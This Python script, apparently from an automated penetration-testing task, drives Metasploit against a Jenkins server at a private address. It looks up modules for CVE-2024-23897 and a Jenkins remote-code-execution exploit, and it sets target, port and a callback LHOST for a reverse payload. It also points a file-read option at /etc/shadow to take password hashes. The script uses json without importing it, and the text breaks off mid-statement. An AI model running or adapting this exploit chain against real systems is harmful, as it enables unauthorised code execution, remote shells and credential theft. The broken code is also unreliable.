import re
import sys

try:
    from framework_evidence import run_tool
except Exception as exc:
    print(json.dumps({"stage": "setup", "error": "Could not import supplied framework_evidence helper", "detail": str(exc)}))
    sys.exit(1)

TARGET = "192.168.5.1"
RCE_MODULE = "exploit/multi/http/jenkins_metaprogramming"
LHOST = "192.168.0.5"  # observed on eth0 in the supplied network facts


def run_console(label, commands):
    argv = ["msfconsole", "-q", "-x", commands]
    try:
        result = run_tool(argv)
        print(json.dumps({"stage": label, "evidence_envelope": result}, sort_keys=True))
        return result
    except Exception as exc:
        print(json.dumps({"stage": label, "command": argv, "error": str(exc)}, sort_keys=True))
        return None


def stdout_of(envelope):
    if not isinstance(envelope, dict):
        return ""
    runs = envelope.get("tool_runs", [])
    pieces = []
    for item in runs if isinstance(runs, list) else []:
        if isinstance(item, dict):
            pieces.append(str(item.get("stdout", "")))
            pieces.append(str(item.get("stderr", "")))
    return "\n".join(pieces)


def module_rows(text):
    rows = []
    for line in text.splitlines():
        match = re.match(r"^\s*\d+\s+((?:exploit|auxiliary|post|scanner)/[A-Za-z0-9_./-]+)\s+(.*)$", line)
        if match:
            rows.append((match.group(1), match.group(2), line))
    return rows


def option_names(text):
    names = set()
    # show options renders option names at the start of table rows.
    for line in text.splitlines():
        match = re.match(r"^\s*([A-Z][A-Z0-9_]{1,})\s+", line)
        if match:
            names.add(match.group(1))
    return names


def option_commands(names, is_file_read=False):
    commands = []
    if "RHOSTS" in names:
        commands.append("set RHOSTS " + TARGET)
    elif "RHOST" in names:
        commands.append("set RHOST " + TARGET)
    if "RPORT" in names:
        commands.append("set RPORT 8080")
    if "TARGETURI" in names:
        commands.append("set TARGETURI /")
    if is_file_read:
        path_option = next((name for name in ("FILEPATH", "PATH", "FILE", "TARGETFILE") if name in names), None)
        if path_option:
            commands.append("set " + path_option + " /etc/shadow")
        return commands, path_option
    if "LHOST" in names:
        commands.append("set LHOST " + LHOST)
    return commands, None


# Search results provide the exact file-read candidate identity and its displayed description.
discovery = run_console(
    "candidate_discovery",
    "search jenkins; search CVE-2024-23897; exit -y"
)
discovery_text = stdout_of(discovery)
rows = module_rows(discovery_text)
file_candidates = []
for module, description, line in rows:
    evidence = (description + " " + line).lower()
    if module == RCE_MODULE:
        continue
    if "jenkins" in module.lower() and ("file read" in evidence or "arbitrary file" in evidence or "cve-2024-23897" in evidence):
